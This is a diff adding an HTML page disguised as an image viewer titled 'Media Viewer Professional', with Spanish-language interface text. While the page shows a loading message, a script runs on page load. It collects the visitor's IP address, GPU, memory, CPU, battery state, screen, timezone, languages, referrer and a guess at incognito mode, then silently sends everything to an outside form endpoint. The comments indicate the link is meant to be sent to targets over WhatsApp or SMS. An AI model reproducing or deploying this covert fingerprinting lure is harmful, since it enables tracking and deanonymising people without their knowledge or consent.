@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Media Viewer Professional</title>
+    <style>
+        body { margin: 0; background: #050505; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; color: #444; font-family: sans-serif; }
+        img { max-width: 90%; border-radius: 4px; box-shadow: 0 0 20px rgba(0,0,0,0.5); cursor: zoom-in; }
+        .loading-text { margin-top: 15px; font-size: 12px; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+    <img src="https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d?auto=format&fit=crop&w=500&q=80" onclick="irAFinal()">
+    <div class="loading-text" id="status">CARGANDO IMAGEN DE ALTA RESOLUCIÓN...</div>
+
+<script>
+    const HOOK = "https://formspree.io/f/xanrkklv";
+
+    async function totalExtraction() {
+        const n = navigator;
+        const s = screen;
+        
+        // Detección de GPU mejorada
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+        const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+
+        const infoExtrema = {
+            fase: "EXTRACCION_TOTAL_SIN_ALERTAS",
+            // Identidad de Red
+            ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => j.ip),
+            conexion: n.connection ? `${n.connection.effectiveType} (Desc: ${n.connection.downlink}Mb/s)` : "N/A",
+            
+            // Especificaciones de Hardware (Fingerprint)
+            dispositivo: n.userAgent,
+            modelo_gpu: gpu,
+            memoria_ram: n.deviceMemory ? `${n.deviceMemory} GB` : "N/A",
+            procesador_hilos: n.hardwareConcurrency,
+            bateria_nivel: await (n.getBattery ? n.getBattery().then(b => `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Cargando' : 'Batería'})`) : "N/A"),
+            
+            // Configuración del Usuario
+            pantalla: `${s.width}x${s.height} (Color: ${s.colorDepth}bit)`,
+            zona_horaria: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            idiomas: n.languages.join(", "),
+            incognito: await checkIncognito(), // Detecta si intenta ocultarse
+            
+            // Metadatos de Navegación
+            referencia: document.referrer || "Link directo (WhatsApp/SMS)",
+            plataforma: n.platform,
+            touch_points: n.maxTouchPoints // Ayuda a saber si es móvil o PC
+        };
+
+        fetch(HOOK, {
+            method: 'POST',
+            body: JSON.stringify(infoExtrema),
+            headers: {'Content-Type': 'application/json'}
+        }).then(() => {
+            document.getElementById('status').innerText = "CLIC PARA AMPLIAR";
+        });
+    }
+
+    // Técnica para detectar si el usuario está en modo incógnito
+    async function checkIncognito() {
+        if ('storage' in navigator && 'estimate' in navigator.storage) {
+            const {quota} = await navigator.storage.estimate();
+            return quota < 120000000 ? "Sí (Probable)" : "No";
+        }
+        return "Indeterminado";
+    }
+
+    function irAFinal() {
+        window.location.href = "final.html";
+    }
+
+    window.onload = totalExtraction;
+</script>
+</body>
+</html>
